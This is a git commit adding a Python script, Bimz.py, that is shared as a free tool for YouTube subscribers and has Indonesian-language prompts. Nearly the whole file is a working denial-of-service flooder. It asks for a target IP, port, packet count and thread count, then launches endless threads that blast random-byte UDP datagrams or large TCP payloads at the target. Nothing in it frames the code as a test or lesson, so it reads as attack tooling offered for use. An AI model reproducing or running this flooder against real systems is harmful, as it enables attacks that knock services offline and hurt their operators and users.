66967cc0e08c5920ecca588d594e8b792da58cbb
Luxec <109461722+Luxec@users.noreply.github.com>
2022-07-25 21:29:00 +0700

    Add files via upload

---
+++ Bimz.py
@@ -0,0 +1,127 @@
+# free tools for subscriber
+# remake ngotak bngst.
+# minimal credit di print nya.
+import os
+import sys
+import time
+import struct
+import signal
+import socket
+import codecs
+import random
+import threading
+
+##########################################################
+# BANNER
+banner = """\033[1;36;40m
+\u001b[31m
+═══════════════════════════════════════════════
+╔══╗
+║╔╗║
+║╚╝╚╦╦╗╔╦═══╦═══╦╗╔╗
+║╔═╗╠╣╚╝╠══║╠══║╠╬╬╝
+║╚═╝║║║║║║══╣║══╬╬╬╗
+╚═══╩╩╩╩╩═══╩═══╩╝╚╝
+═══════════════════════════════════════════════
+# Build at 9/7/2022   ════>   Subscribe YouTube Bimzz
+╔═══════════════════════════════════════════════"""
+##########################################################
+# MAIN MENU
+os.system('cls' if os.name=='nt' else 'clear')
+print(banner)
+choice = str(input("╠═══[ Masukkan METHODS-nya [tcp/udp] ] •\n╚══> "))
+time.sleep(1)
+os.system('cls' if os.name=='nt' else 'clear')
+print(banner)
+ip = str(input("╠═══[ Masukkan IP-nya ] •\n╚══> "))
+time.sleep(1)
+os.system('cls' if os.name=='nt' else 'clear')
+print(banner)
+port = int(input("╠═══[ Masukkan PORT-nya ] •\n╚══> "))
+time.sleep(1)
+os.system('cls' if os.name=='nt' else 'clear')
+print(banner)
+times = int(input("╠═══[ Masukkan PACKETs-nya ] •\n╚══> "))
+time.sleep(1)
+os.system('cls' if os.name=='nt' else 'clear')
+print(banner)
+size = int(input("╠═══[ Masukkan THREADs-nya ] •\n╚══> "))
+##########################################################
+
+def x():
+	data = random._urandom(818)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+		except:
+			print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+
+def xx():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+		except:
+			print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+
+def xxx():
+	data = random._urandom(999)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+		except:
+			print(f"[ UDP ] | Bimzzx X ΣXCITΣD Attack ")
+
+def tcpx():
+  data = random._urandom(761)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(f"[ TCP ] | Bimzzx X ΣXCITΣD ")
+    except:
+      s.close()
+      print(f"[ TCP ] | Bimzzx X ΣXCITΣD ")
+
+def tcpxx():
+  data = random._urandom(102400)
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(f"[ TCP ] | Bimzzx X ΣXCITΣD")
+    except:
+      s.close()
+      print(f"[ TCP ] | Bimzzx X ΣXCITΣD ")
+
+for i in range(size):
+	if choice == 'udp':
+		fuckk = threading.Thread(target = x)
+		fuckk.start()
+		fuck = threading.Thread(target = xx)
+		fuck.start()
+		fuckkk = threading.Thread(target = xxx)
+		fuckkk.start()
+	elif choice == 'tcp':
+		fucking = threading.Thread(target = tcpx)
+		fucking.start()
+		fuckking = threading.Thread(target = tcpxx)
+		fuckking.start()
